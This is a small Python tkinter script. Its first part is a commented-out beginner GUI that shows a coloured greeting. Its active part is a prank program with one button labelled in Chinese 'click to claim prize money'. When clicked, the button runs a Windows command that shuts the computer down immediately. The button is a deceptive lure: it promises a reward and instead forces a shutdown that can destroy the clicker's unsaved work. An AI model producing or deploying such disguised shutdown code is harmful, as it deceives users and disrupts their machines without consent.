# from tkinter import *
# import random as r

# def hi_fun():
#     display.config(text="Hi Singular", fg=color[r.randint(0, len(color) - 1)])

# color = [
#     "black", "red", "green", "blue", "yellow", "orange", "purple", "pink",
#     "brown", "gray"
# ]
# windows = Tk()
# windows.title("My first GUI")

# btn = Button(windows, text="1", command=hi_fun, fg="black", bg="#FFFFFF")
# btn.pack()

# display = Label(windows, text="")
# display.pack()
# windows.mainloop()
from tkinter import *
import os
import tkinter.messagebox


# user define function
def shutdown():
    return os.system("shutdown /s /t 1")


# tkinter object
tk = Tk()

# background set to grey
tk.configure(bg='light grey')

# creating a button using the widget
# Buttons that will call the submit function
btn = Button(tk, text="點擊領取獎金", command=shutdown, fg="gold",
             bg="black").grid(row=0)
mainloop()